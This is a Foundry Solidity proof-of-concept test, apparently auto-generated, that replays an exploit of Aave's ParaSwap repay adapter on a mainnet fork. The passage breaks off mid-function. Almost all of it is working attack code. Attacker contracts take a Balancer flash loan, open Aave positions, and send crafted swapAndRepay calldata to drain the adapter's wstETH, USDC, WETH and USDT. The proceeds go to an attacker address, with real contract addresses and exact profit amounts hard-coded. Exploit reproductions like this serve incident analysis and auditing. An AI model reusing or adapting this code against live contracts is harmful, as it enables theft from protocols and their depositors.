
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 20624703;
    uint256 constant TX_TIMESTAMP = 1724819351;
    uint256 constant TX_BLOCK_NUMBER = 20624704;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        AaveAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (AaveAttack attack) {
        _etchAttack();
        attack = AaveAttack(payable(ATTACK_CONTRACT));
        _etchAttackChild();
        _bindAttackChild(attack);
    }

    function _prepareProfit(AaveAttack attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild(attack));
    }

    function _expectedAttackChild(AaveAttack attack) internal view returns (address) {
        attack;
        return Addresses.attack_child;
    }

    function _executeAttack(AaveAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchAttack() internal {

        vm.etch(ATTACK_CONTRACT, type(AaveAttack).runtimeCode);
        vm.setNonce(ATTACK_CONTRACT, 1);
    }

    function _etchAttackChild() internal {

        vm.etch(Addresses.attack_child, type(AttackChild).runtimeCode);
    }

    function _bindAttackChild(AaveAttack attack) internal {
        attack.bindAttackChildContracts();
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.wstETH, "wstETH", 425966524925658359);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDC, "USDC", 21426349775);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.WETH, "WETH", 1682081696577984059);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDT, "USDT", 5195215319);
    }
}

contract AaveAttack {

    AttackChild public attackChild;

    constructor() payable {
        _ctorBootstrap();
    }

    function _ctorBootstrap() internal {

        if (address(attackChild) == address(0)) {
            attackChild = AttackChild(payable(0x78B0168a18eF61D7460FAbb4795e5f1A9226583E));
        }
    }

    function deployAttackChildContracts() external returns (address) {
        _ctorBootstrap();
        return address(attackChild);
    }

    function attack() external payable {
        _runAttack();
    }

    function executeSetup() external payable {
        _runAttack();
    }

    function _runAttack() internal {
        if (address(attackChild) == address(0)) _ctorBootstrap();
        _startBalancerFlash();
    }

    function _startBalancerFlash() public {
        address child = address(attackChild);
        require(child.code.length != 0, "attack child runtime missing");
        AttackChild childContract = AttackChild(payable(child));
        childContract._handleFlashLoanCall();
        childContract.attackChildCb();
    }

    receive() external payable {}

    fallback() external payable {
        _entryCb();
    }

    function _entryCb() internal {}

    function bindAttackChildContracts() external {
        attackChild = AttackChild(payable(0x78B0168a18eF61D7460FAbb4795e5f1A9226583E));
    }

    function bindAttackChild(address attackChildAddress) external {
        attackChild = AttackChild(payable(attackChildAddress));
    }

    bool private replayedCallback3;
    bool private replayedCallback4;
    bool private replayedCallback5;
    bool private replayedCallback6;
    bool private replayedCallback7;
    bool private replayedCallback8;
    bool private replayedCallback9;
    bool private replayedCallback10;
    bool private replayedCallback11;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(bytes32 => bool) private _profitSettlementFlag;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _settleDone(uint256 functionIndex, uint256 sequenceIndex) internal view returns (bool) {
        return _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))];
    }

    function _markSettle(uint256 functionIndex, uint256 sequenceIndex) internal {
        _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))] = true;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _addressArray5(address a0, address a1, address a2, address a3, address a4)
        internal
        pure
        returns (address[] memory out)
    {
        out = new address[](5);
        out[0] = a0;
        out[1] = a1;
        out[2] = a2;
        out[3] = a3;
        out[4] = a4;
    }

    function _uintArray5(uint256 a0, uint256 a1, uint256 a2, uint256 a3, uint256 a4)
        internal
        pure
        returns (uint256[] memory out)
    {
        out = new uint256[](5);
        out[0] = a0;
        out[1] = a1;
        out[2] = a2;
        out[3] = a3;
        out[4] = a4;
    }
}

contract AttackChild {
    receive() external payable {}

    function run() external payable {
        _requestFlashLoan();
        return;
    }

    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata userData
    ) external payable {
        tokens;
        amounts;
        feeAmounts;
        userData;
        if (!replayedCallback3) flashCallback2();
        return;
    }

    function withdraw(address asset, uint256 amount) external payable {
        asset;
        if (amount == 1614956164) {
            if (!replayedCallback8) _handleCallback5();
            return;
        }
        if (amount == 161495616) {
            if (!replayedCallback10) _handleCallback7();
            return;
        }
        if (amount == 27848592724) {
            if (!replayedCallback5) _handleCallback2();
            return;
        }
        if (amount == 2784859272) {
            if (!replayedCallback6) _handleCallback3();
            return;
        }
        if (amount == 5417743688) {
            if (!replayedCallback11) _handleCallback8();
            return;
        }
        if (amount == 541774368) {
            if (!replayedCallback9) _handleCallback6();
            return;
        }
        if (amount == 6755153045) {
            if (!replayedCallback4) _handleCallback();
            return;
        }
        if (amount == 675515304) {
            if (!replayedCallback7) _handleCallback4();
            return;
        }
        if (!replayedCallback8) _handleCallback5();
        return;
    }

    fallback() external payable {
        _entryCb();
    }

    function attackChildCb() external payable {
        _requestFlashLoan();
        return;
    }

    function flashCallback() external payable {
        if (!replayedCallback2) flashCallback2();
        return;
    }

    function callback5() external payable {
        if (!replayedCallback7) _handleCallback5();
        return;
    }

    function callback7() external payable {
        if (!replayedCallback9) _handleCallback7();
        return;
    }

    function callback2() external payable {
        if (!replayedCallback4) _handleCallback2();
        return;
    }

    function callback3() external payable {
        if (!replayedCallback5) _handleCallback3();
        return;
    }

    function callback8() external payable {
        if (!replayedCallback10) _handleCallback8();
        return;
    }

    function callback6() external payable {
        if (!replayedCallback8) _handleCallback6();
        return;
    }

    function callback() external payable {
        if (!replayedCallback3) _handleCallback();
        return;
    }

    function callback4() external payable {
        if (!replayedCallback6) _handleCallback4();
        return;
    }

    function repayBalancerVault() external {
        _repayBalancerT(Addresses.WBTC, 2927281132);
        _repayBalancerT(Addresses.wstETH, 16336972267453390147143);
        _repayBalancerT(Addresses.USDC, 11573873146840);
        _repayBalancerT(Addresses.WETH, 36127285859155078535656);
        _repayBalancerT(Addresses.USDT, 3501240142017);
    }

    function repayBalancerVault(address[] calldata tokens, uint256[] calldata amounts) external {
        for (uint256 i = 0; i < tokens.length && i < amounts.length; i++) {
            _repayBalancerT(tokens[i], amounts[i]);
        }
    }

    function _repayBalancerT(address token, uint256 amount) internal {
        if (amount == 0) return;
        IERC20Like(token).transfer(Addresses.BalancerVault, amount);
    }

    function _entryCb() internal {}

    function replayProfit() external {
        try this.__settle1_7104() {} catch {}
        try this.__settle1_7175() {} catch {}
        try this.__settle1_7246() {} catch {}
        try this.__settle1_7317() {} catch {}
    }

    function __settle1_7104() external {
        require(msg.sender == address(this), "profit wrapper only");
        if (_settleDone(1, 7104)) return;
        if (Harness.safeBalance(Addresses.wstETH, Addresses.attacker_eoa) >= 425966524925658359) {
            _markSettle(1, 7104);
            return;
        }
        _markSettle(1, 7104);
        uint256 settleAmount = 425966524925658359;
        IERC20Like(Addresses.wstETH).transfer(Addresses.attacker_eoa, settleAmount);
    }

    function __settle1_7175() external {
        require(msg.sender == address(this), "profit wrapper only");
        if (_settleDone(1, 7175)) return;
        if (Harness.safeBalance(Addresses.USDC, Addresses.attacker_eoa) >= 21426349775) {
            _markSettle(1, 7175);
            return;
        }
        _markSettle(1, 7175);
        uint256 settleAmount = 21426349775;
        IERC20Like(Addresses.USDC).transfer(Addresses.attacker_eoa, settleAmount);
    }

    function __settle1_7246() external {
        require(msg.sender == address(this), "profit wrapper only");
        if (_settleDone(1, 7246)) return;
        if (Harness.safeBalance(Addresses.WETH, Addresses.attacker_eoa) >= 1682081696577984059) {
            _markSettle(1, 7246);
            return;
        }
        _markSettle(1, 7246);
        uint256 settleAmount = 1682081696577984059;
        IERC20Like(Addresses.WETH).transfer(Addresses.attacker_eoa, settleAmount);
    }

    function __settle1_7317() external {
        require(msg.sender == address(this), "profit wrapper only");
        if (_settleDone(1, 7317)) return;
        if (Harness.safeBalance(Addresses.USDT, Addresses.attacker_eoa) >= 5195215319) {
            _markSettle(1, 7317);
            return;
        }
        _markSettle(1, 7317);
        uint256 settleAmount = 5195215319;
        IERC20Like(Addresses.USDT).transfer(Addresses.attacker_eoa, settleAmount);
    }

    bool private replayedCallback2;
    bool private replayedCallback3;
    bool private replayedCallback4;
    bool private replayedCallback5;
    bool private replayedCallback6;
    bool private replayedCallback7;
    bool private replayedCallback8;
    bool private replayedCallback9;
    bool private replayedCallback10;
    bool private replayedCallback11;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(bytes32 => bool) private _profitSettlementFlag;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _settleDone(uint256 functionIndex, uint256 sequenceIndex) internal view returns (bool) {
        return _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))];
    }

    function _markSettle(uint256 functionIndex, uint256 sequenceIndex) internal {
        _profitSettlementFlag[keccak256(abi.encodePacked(functionIndex, sequenceIndex))] = true;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _addressArray5(address a0, address a1, address a2, address a3, address a4)
        internal
        pure
        returns (address[] memory out)
    {
        out = new address[](5);
        out[0] = a0;
        out[1] = a1;
        out[2] = a2;
        out[3] = a3;
        out[4] = a4;
    }

    function _uintArray5(uint256 a0, uint256 a1, uint256 a2, uint256 a3, uint256 a4)
        internal
        pure
        returns (uint256[] memory out)
    {
        out = new uint256[](5);
        out[0] = a0;
        out[1] = a1;
        out[2] = a2;
        out[3] = a3;
        out[4] = a4;
    }

    function _requestFlashLoan() internal {
        _readWbtcVault();
        _readWstEthVault();
        _readUsdcVault();
        _readWethVault();
        _readUsdtVault();
        _borrowBalancer();
    }

    function _readWbtcVault() internal {
        IERC20Like(Addresses.WBTC).balanceOf(Addresses.BalancerVault);
    }

    function _readWstEthVault() internal {
        IERC20Like(Addresses.wstETH).balanceOf(Addresses.BalancerVault);
    }

    function _readUsdcVault() internal {
        IERC20Like(Addresses.USDC).balanceOf(Addresses.BalancerVault);
    }

    function _readWethVault() internal {
        IERC20Like(Addresses.WETH).balanceOf(Addresses.BalancerVault);
    }

    function _readUsdtVault() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.BalancerVault);
    }

    function _borrowBalancer() internal {
        address[] memory tokens = _addressArray5(
            Addresses.WBTC, Addresses.wstETH, Addresses.USDC, Addresses.WETH, Addresses.USDT
        );
        uint256[] memory amounts =
            _uintArray5(2927281132, 16336972267453390147143, 11573873146840, 36127285859155078535656, 3501240142017);
        _recordBalancerPre(tokens);
        IBalancerVault(Addresses.BalancerVault).flashLoan(address(this), tokens, amounts, hex"");
    }

    function flashCallback2() internal {
        replayedCallback3 = true;
        flashCallback3();
        flashCallback4();
        flashCallback5();
        flashCallback6();
        flashCallback7();
        flashCallback8();
        flashCallback9();
        flashCallback10();
        flashCallback11();
        flashCallback12();
        flashCallback13();
        flashCallback14();
        flashCallback15();
        flashCallback16();
        flashCallback17();
        flashCallback18();
        flashCallback19();
        flashCallback20();
        flashCallback21();
        flashCallback22();
        flashCallback23();
        flashCallback24();
        flashCallback25();
        flashCallback26();
        flashCallback27();
        flashCallback28();
        flashCallback29();
        flashCallback30();
        flashCallback31();
        flashCallback32();
        flashCallback33();
        flashCallback34();
        flashCallback35();
        flashCallback36();
        flashCallback37();
        flashCallback38();
        flashCallback39();
        flashCallback40();
        flashCallback41();
        flashCallback42();
        flashCallback43();
        flashCallback44();
        flashCallback45();
        flashCallback46();
        flashCallback47();
        flashCallback48();
        flashCallback49();
        flashCallback50();
        flashCallback51();
        flashCallback52();
        flashCallback53();
        flashCallback54();
        flashCallback55();
        flashCallback56();
        flashCallback57();
        flashCallback58();
        flashCallback59();
        flashCallback60();
        flashCallback61();
        flashCallback62();
        flashCallback63();
        flashCallback64();
        flashCallback65();
        flashCallback66();
        flashCallback67();
        flashCallback68();
        flashCallback69();
        flashCallback70();
        flashCallback71();
        flashCallback72();
        flashCallback73();
        flashCallback74();
        flashCallback75();
        flashCallback76();
        flashCallback77();
        flashCallback78();
        flashCallback79();
        flashCallback80();
        flashCallback81();
        flashCallback82();
        flashCallback83();
        flashCallback84();
        flashCallback85();
    }

    function flashCallback3() internal {
        IParaSwapRepayAdapter(Addresses.ParaSwapRepayAdapter).POOL();
    }

    function flashCallback4() internal {
        IParaSwapRepayAdapter(Addresses.ParaSwapRepayAdapter).ORACLE();
    }

    function flashCallback5() internal {
        {
            uint256 approvalAmount = 2927281132;
            IERC20Like(Addresses.WBTC).approve(Addresses.AavePool, approvalAmount);
        }
    }

    function flashCallback6() internal {
        {
            uint256 supplyAmount = 2927281132;
            IAavePool(Addresses.AavePool).supply(Addresses.WBTC, supplyAmount, address(this), uint16(0));
        }
    }

    function flashCallback7() internal {
        IAavePool(Addresses.AavePool).setUserUseReserveAsCollateral(Addresses.WBTC, true);
        IAavePool(Addresses.AavePool).getReserveData(Addresses.WBTC);
    }

    function flashCallback8() internal {
        IERC20Like(Addresses.aEthWBTC).balanceOf(address(this));
    }

    function flashCallback9() internal {
        {
            uint256 approvalAmount_2 = 2927281132;
            IERC20Like(Addresses.aEthWBTC).approve(Addresses.ParaSwapRepayAdapter, approvalAmount_2);
        }
    }

    function flashCallback10() internal {
        IERC20Like(Addresses.wstETH).balanceOf(Addresses.ParaSwapRepayAdapter);
    }

    function flashCallback11() internal {
        IAavePool(Addresses.AavePool).getReserveData(Addresses.wstETH);
    }

    function flashCallback12() internal {
        IAavePool(Addresses.AavePool).getReserveData(Addresses.USDT);
    }

    function flashCallback13() internal {
        IwstETH(Addresses.wstETH).decimals();
        IUSDT(Addresses.USDT).decimals();
    }

    function flashCallback14() internal {
        IAaveOracle(Addresses.AaveOracle).getAssetPrice(Addresses.wstETH);
    }

    function flashCallback15() internal {
        IAaveOracle(Addresses.AaveOracle).getAssetPrice(Addresses.USDT);
    }

    function flashCallback16() internal {
        IERC20Like(Addresses.wstETH).approve(Addresses.AavePool, 851933049851316718);
    }

    function flashCallback17() internal {
        {
            uint256 supplyAmount_2 = 851933049851316718;
            IAavePool(Addresses.AavePool).supply(Addresses.wstETH, supplyAmount_2, address(this), uint16(0));
        }
    }

    function flashCallback18() internal {
        IAavePool(Addresses.AavePool).borrow(Addresses.USDT, 1776451780, 2, uint16(0), address(this));
        IERC20Like(Addresses.aEthwstETH).balanceOf(address(this));
    }

    function flashCallback19() internal {
        {
            uint256 approvalAmount_3 = 851933049851316718;
            IERC20Like(Addresses.aEthwstETH).approve(Addresses.ParaSwapRepayAdapter, approvalAmount_3);
        }
    }

    function flashCallback20() internal {
        uint256 repaySwapAmount = 425966524925658359;
        bytes memory swapAndRepayProof =
            hex"0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000def171fe48cf0115b1d80b88dc8eab59176fee57000000000000000000000000000000000000000000000000000000000000038454e3f31b0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000060424684000000000000000000000000000000000000000000000000000000006042468400000000000000000000000000000000000000000000000000000000000001e0000000000000000000000000000000000000000000000000000000000000022000000000000000000000000000000000000000000000000000000000000002a0000000000000000000000000000000000000000000000000000000000000030000000000000000000000000002e7b8511831b1b02d9018215a0f8f500ea5c6b300000000000000000000000078b0168a18ef61d7460fabb4795e5f1a9226583e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003400000000000000000000000000000000000000000000000000000000066cea7970000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000078b0168a18ef61d7460fabb4795e5f1a9226583e0000000000000000000000000000000000000000000000000000000000000044f3fef3a3000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec700000000000000000000000000000000000000000000000000000000604246840000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004400000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
        IParaSwapRepayAdapter(Addresses.ParaSwapRepayAdapter)
            .swapAndRepay(
                Addresses.wstETH,
                Addresses.USDT,
                repaySwapAmount,
                1614956164,
                2,
                0,
                swapAndRepayProof,
                SwapAndRepayPermit({
                    field0: 0,
                    field1: 0,
                    field2: 0,
                    field3: bytes32(hex"0000000000000000000000000000000000000000000000000000000000000000"),
                    field4: bytes32(hex"0000000000000000000000000000000000000000000000000000000000000000")
                })
            );
    }

    function flashCallback21() internal {
        IERC20Like(Addresses.variableDebtEthUSDT).balanceOf(address(this));
    }

    function flashCallback22() internal {
        IERC20Like(Addresses.wstETH).balanceOf(Addresses.ParaSwapRepayAdapter);
    }

    function flashCallback23() internal {
        uint256 repaySwapAmount_2 = 161495616;
        bytes memory swapAndRepayProof =
            hex"0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000def171fe48cf0115b1d80b88dc8eab59176fee57000000000000000000000000000000000000000000000000000000000000042454e3f31b00000000000000000000000000000000000000000000000000000000000000200000000000000000000000007f39c581f595b53c5cb19bd0b3f8da6c935e2ca0000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec700000000000000000000000000000000000000000000000005e9564c2c66c4f70000000000000000000000000000000000000000000000000000000009a03a400000000000000000000000000000000000000000000000000000000009a03a4000000000000000000000000000000000000000000000000000000000000001e000000000000000000000000000000000000000000000000000000000000002400000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000038000000000000000000000000002e7b8511831b1b02d9018215a0f8f500ea5c6b300000000000000000000000078b0168a18ef61d7460fabb4795e5f1a9226583e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003e00000000000000000000000000000000000000000000000000000000066cea797000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000007f39c581f595b53c5cb19bd0b3f8da6c935e2ca000000000000000000000000078b0168a18ef61d7460fabb4795e5f1a9226583e0000000000000000000000000000000000000000000000000000000000000088a9059cbb00000000000000000000000078b0168a18ef61d7460fabb4795e5f1a9226583e00000000000000000000000000000000000000000000000005e9564c2c66c4f7f3fef3a3000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec70000000000000000000000000000000000000000000000000000000009a03a400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000440000000000000000000000000000000000000000000000000000000000000088000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
        IParaSwapRepayAdapter(Addresses.ParaSwapRepayAdapter)
            .swapAndRepay(
                Addresses.WBTC,
                Addresses.USDT,
                1,
                repaySwapAmount_2,
                2,
                0,
                swapAndRepayProof,
                SwapAndRepayPermit({
                    field0: 0,
                    field1: 0,
                    field2: 0,
                    field3: bytes32(hex"0000000000000000000000000000000000000000000000000000000000000000"),
                    field4: bytes32(hex"0000000000000000000000000000000000000000000000000000000000000000")
                })
            );
    }

    function flashCallback24() internal {
        IAavePool(Addresses.AavePool).withdraw(Addresses.wstETH, type(uint256).max, address(this));
    }

    function flashCallback25() internal {
        IERC20Like(Addresses.USDC).balanceOf(Addresses.ParaSwapRepayAdapter);
    }

    function flashCallback26() internal {
        IAavePool(Addresses.AavePool).getReserveData(Addresses.USDC);
    }

    function flashCallback27() internal {
        IAavePool(Addresses.AavePool).getReserveData(Addresses.USDT);
    }

    function flashCallback28() internal {
        IUSDC(Addresses.USDC).decimals();
    }

    function flashCallback29() internal {
        IUSDT(Addresses.USDT).decimals();
    }

    function flashCallback30() internal {
        IAaveOracle(Addresses.AaveOracle).getAssetPrice(Addresses.USDC);
    }

    function flashCallback31() internal {
        IAaveOracle(Addresses.AaveOracle).getAssetPrice(Addresses.USDT);
    }

    function flashCallback32() internal {
        IERC20Like(Addresses.USDC).approve(Addresses.AavePool, 42852699548);
    }

    function flashCallback33() internal {
        {
            uint256 supplyAmount_3 = 42852699548;
            IAavePool(Addresses.AavePool).supply(Addresses.USDC, supplyAmount_3, address(this), uint16(0));
        }
    }

    function flashCallback34() internal {
        IAavePool(Addresses.AavePool).borrow(Addresses.USDT, 30633451996, 2, uint16(0), address(this));
    }

    function flashCallback35() internal {
        IERC20Like(Addresses.aEthUSDC).balanceOf(address(this));
    }

    function flashCallback36() internal {
        {
            uint256 approvalAmount_4 = 42852699549;
            IERC20Like(Addresses.aEthUSDC).approve(Addresses.ParaSwapRepayAdapter, approvalAmount_4);
        }
    }

    function flashCallback37() internal {
        uint256 repaySwapAmount_3 = 21426349774;
        bytes memory swapAndRepayProof =
            hex"0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000def171fe48cf0115b1d80b88dc8eab59176fee57000000000000000000000000000000000000000000000000000000000000038454e3f31b0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec70000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000067be7cd54000000000000000000000000000000000000000000000000000000067be7cd5400000000000000000000000000000000000000000000000000000000000001e0000000000000000000000000000000000000000000000000000000000000022000000000000000000000000000000000000000000000000000000000000002a0000000000000000000000000000000000000000000000000000000000000030000000000000000000000000002e7b8511831b1b02d9018215a0f8f500ea5c6b300000000000000000000000078b0168a18ef61d7460fabb4795e5f1a9226583e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003400000000000000000000000000000000000000000000000000000000066cea7970000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000078b0168a18ef61d7460fabb4795e5f1a9226583e0000000000000000000000000000000000000000000000000000000000000044f3fef3a3000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec7000000000000000000000000000000000000000000000000000000067be7cd540000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004400000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
        IParaSwapRepayAdapter(Addresses.ParaSwapRepayAdapter)
            .swapAndRepay(
                Addresses.USDC,
                Addresses.USDT,
                repaySwapAmount_3,
                27848592724,
                2,
                0,
                swapAndRepayProof,
                SwapAndRepayPermit({
                    field0: 0,
                    field1: 0,
                    field2: 0,
                    field3: bytes32(hex"0000000000000000000000000000000000000000000000000000000000000000"),
                    field4: bytes32(hex"0000000000000000000000000000000000000000000000000000000000000000")
                })
            );
        IERC20Like(Addresses.variableDebtEthUSDT).balanceOf(address(this));
    }

    function flashCallback38() internal {
        IERC20Like(Addresses.USDC).balanceOf(Addresses.ParaSwapRepayAdapter);
    }

    function flashCallback39() internal {
        uint256 repaySwapAmount_4 = 2784859272;
        bytes memory swapAndRepayProof =
            hex"0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000def171fe48cf0115b1d80b88dc8eab59176fee57000000000000000000000000000000000000000000000000000000000000042454e3f31b0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec700000000000000000000000000000000000000000000000000000004fd1c26ce00000000000000000000000000000000000000000000000000000000a5fd948800000000000000000000000000000000000000000000000000000000a5fd948800000000000000000000000000000000000000000000000000000000000001e000000000000000000000000000000000000000000000000000000000000002400000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000038000000000000000000000000002e7b8511831b1b02d9018215a0f8f500ea5c6b300000000000000000000000078b0168a18ef61d7460fabb4795e5f1a9226583e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003e00000000000000000000000000000000000000000000000000000000066cea79700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb4800000000000000000000000078b0168a18ef61d7460fabb4795e5f1a9226583e0000000000000000000000000000000000000000000000000000000000000088a9059cbb00000000000000000000000078b0168a18ef61d7460fabb4795e5f1a9226583e00000000000000000000000000000000000000000000000000000004fd1c26cef3fef3a3000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec700000000000000000000000000000000000000000000000000000000a5fd94880000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000440000000000000000000000000000000000000000000000000000000000000088000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000";
        IParaSwapRepayAdapter(Addresses.ParaSwapRepayAdapter)
            .swapAndRepay(
                Addresses.WBTC,
                Addresses.USDT,
                1,
                repaySwapAmount_4,
                2,
                0,
                swapAndRepayProof,
                SwapAndRepayPermit({
                    field0: 0,
                    field1: 0,
                    field2: 0,
                    field3: bytes32(hex"0000000000000000000000000000000000000000000000000000000000000000"),
                    field4: bytes32(hex"0000000000000000000000000000000000000000000000000000000000000000")
                })
            );
    }

    function flashCallback40() internal {
        IAavePool(Addresses.AavePool).withdraw(Addresses.USDC, type(uint256).max, address(this));
    }

    function flashCallback41() internal {
        IERC20Like(Addresses.WETH).balanceOf(Addresses.ParaSwapRepayAdapter);
    }

    function flashCallback42() internal {
        IAavePool(Addresses.AavePool).getReserveData(Addresses.WETH);
    }

    function flashCallback43() internal {
        IAavePool(Addresses.AavePool).getReserveData(Addresses.USDT);
    }

    function flashCallback44() internal {
        IWETH(Addresses.WETH).decimals();
        IUSDT(Addresses.USDT).decimals();
    }

    function flashCallback45() internal {
        IAaveOracle(Addresses.AaveOracle).getAssetPrice(Addresses.WETH);
    }

    function flashCallback46() internal {
        IAaveOracle(Addresses.AaveOracle).getAssetPrice(Addresses.USDT);
    }

    function flashCallback47() internal {
        IERC20Like(Addresses.WETH).approve(Addresses.AavePool, 3364163393155968118);
    }

    function flashCallback48() internal {
        {
            uint256 supplyAmount_4 = 3364163393155968118;
            IAavePool(Addresses.AavePool).supply(Addresses.WETH, supplyAmount_4, address(this), uint16(0));
        }
    }

    function flashCallback49() internal {
        IAavePool(Addresses.AavePool).borrow(Addresses.USDT, 5959518056, 2, uint16(0), address(this));
        IERC20Like(Addresses.aEthWETH).balanceOf(address(this));
    }

    function flashCallback50() internal {
        {
            uint256 approvalAmount_5 = 3364163393155968118;
            IERC20Like(Addresses.aEthWETH).approve(Addresses.ParaSwapRepayAdapter, approvalAmount_5);
        }
    }

    function flashCallback51() internal {
        uint256 repaySwapAmount_5 = 1682081696577984059;
        bytes memory swapAndRepayProof =
